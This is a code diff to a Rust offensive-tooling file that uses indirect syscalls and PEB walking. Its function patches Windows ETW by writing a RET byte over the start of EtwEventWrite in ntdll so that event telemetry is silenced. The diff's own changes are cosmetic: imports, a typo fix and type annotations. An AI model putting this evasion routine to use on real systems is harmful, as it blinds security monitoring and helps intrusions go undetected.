@@ -7,12 +7,11 @@
 // TODO => Implement stuff from this article ^
 // TODO Hardware breakpoints
 
-use std::{mem, process};
+use std::mem;
 
-use thermite::{check_status, error, info};
+use thermite::info;
 use thermite::indirect_syscall as syscall;
 use thermite::models::windows::*;
-use thermite::models::windows::nt_status::NtStatus;
 use thermite::peb_walk::{get_function_address, get_module_address};
 
 
@@ -21,13 +20,13 @@ fn main() {
 }
 
 
-// Patches ETW by rewiting the first bit of EtwEventWrite with a RET instruction
+// Patches ETW by rewriting the first bit of EtwEventWrite with a RET instruction
 // This technique is easy to detect and i didn't get it to work remotely
 fn local_etw_patcher() {
 	let process_handle: isize = -1;
-	let mut old_protec = 0u32;
-	let mut new_protec = 0u32;
-	let patch = char::from(0xc3);
+	let mut old_protec: u32 = 0;
+	let mut new_protec: u32 = 0;
+	let patch: char = char::from(0xc3);
 
 	let ntdll_handle = unsafe { get_module_address("ntdll.dll") }.unwrap();
 	let mut etw_handle = unsafe { get_function_address("EtwEventWrite", ntdll_handle) }.unwrap();
@@ -45,7 +44,7 @@ fn local_etw_patcher() {
 	syscall!("NtWriteVirtualMemory",
         process_handle,      // [in]            HANDLE  ProcessHandle,
         &etw_handle,         // [in]            PVOID   *BaseAddress,
-        &patch,              // [in]            PVOID   Buffer,
+        &patch,              // [in]            PVOID   buffer,
         1usize,              // [in]            ULONG   NumberOfBytesToWrite,
         &mut bytes_written); // [out, optional] PULONG  NumberOfBytesWritten ,
 
